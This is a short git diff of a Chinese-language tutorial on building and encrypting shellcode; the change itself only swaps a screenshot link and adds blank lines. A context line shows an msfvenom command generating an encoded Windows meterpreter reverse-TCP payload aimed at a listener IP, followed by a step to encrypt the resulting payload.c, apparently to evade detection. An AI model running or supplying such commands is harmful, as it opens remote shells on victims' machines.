@@ -34,9 +34,11 @@ msfvenom -e x64/zutto_dekiru -p windows/x64/meterpreter/reverse_tcp lhost=192.16
 ![图片](https://user-images.githubusercontent.com/34683107/188174724-ddbe398b-d378-4336-a79a-6a7e406659a4.png)
 
 得到一个payload.c的文件
+
 内容为：
 
-![图片](https://user-images.githubusercontent.com/34683107/188174894-5e3795b5-bb61-4f59-9b73-4cc371569387.png)
+![图片](https://user-images.githubusercontent.com/34683107/188178026-bd171622-6f6e-4568-af43-e2d49755220c.png)
+
 # 加密Payload
 ```
 Shellcode_encryption.exe    payload.c
